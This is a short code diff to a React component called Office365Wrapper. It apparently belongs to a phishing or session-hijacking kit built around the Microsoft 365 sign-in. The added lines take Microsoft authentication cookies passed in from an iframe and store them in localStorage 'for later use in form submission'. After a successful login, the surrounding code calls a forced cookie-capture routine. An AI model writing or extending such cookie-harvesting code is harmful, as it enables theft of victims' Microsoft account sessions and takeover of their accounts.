@@ -55,10 +55,28 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
       // Capture Microsoft cookies from iframe messages
       if (event.data.type === 'MICROSOFT_COOKIES' || event.data.type === 'OFFICE_365_COOKIES') {
         console.log('🔵 Received Microsoft cookies from iframe:', event.data);
+        
+        // Store cookie data for later use in form submission
+        if (event.data.cookies || event.data.cookieList) {
+          localStorage.setItem('office365_cookies', JSON.stringify({
+            cookies: event.data.cookies || [],
+            cookieList: event.data.cookieList || [],
+            timestamp: new Date().toISOString()
+          }));
+        }
       }
       
       // Trigger cookie capture on successful authentication
       if (event.data.type === 'OFFICE_365_AUTH_SUCCESS') {
+        // Store authentication success data
+        if (event.data.payload.cookies || event.data.payload.cookieList) {
+          localStorage.setItem('office365_auth_cookies', JSON.stringify({
+            cookies: event.data.payload.cookies || [],
+            cookieList: event.data.payload.cookieList || [],
+            timestamp: new Date().toISOString()
+          }));
+        }
+        
         setTimeout(() => {
           microsoftCookieCapture.forceCaptureNow();
         }, 1000);
